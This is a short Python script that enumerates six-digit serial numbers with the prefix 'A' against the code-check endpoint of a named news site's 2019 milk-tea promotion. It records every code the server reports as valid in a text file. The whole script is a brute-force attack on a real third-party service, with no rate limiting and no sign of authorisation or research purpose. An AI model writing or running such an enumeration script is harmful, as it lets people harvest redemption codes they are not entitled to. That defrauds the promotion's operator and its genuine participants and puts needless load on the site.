from bs4 import BeautifulSoup
import requests
import re
import string
from lxml import html
import chardet
import json
import os
RANGE = 100000
leadingZeros = "00000"
baseURL = "https://www.niusnews.com/index.php/milktea2019/sn_check?pp_sn="

def getRandom(headEN):
    numDatas = []
    for i in range(100000, 100000+RANGE):
        num = leadingZeros+str(i)
        if((i%100) == 0):
            print(i)
        while(len(num) > 6):
            num = num[1:len(num)]
        session = requests.Session()
        res = session.get(baseURL+headEN+num)
        soup = BeautifulSoup(res.text, "lxml")
        resJson = json.loads(soup.text)
        if(resJson["status"] == True):
            print(headEN+num)
            numDatas.append(headEN+num)
    return numDatas

numDatas = []
headENRange = 'A'
for headEN in headENRange:
    print("--- "+headEN+" ---")
    numDatas = getRandom(headEN)
    with open("datas.txt", 'a+') as f:
        for data in numDatas:
            f.write(data)
        f.write("\n")
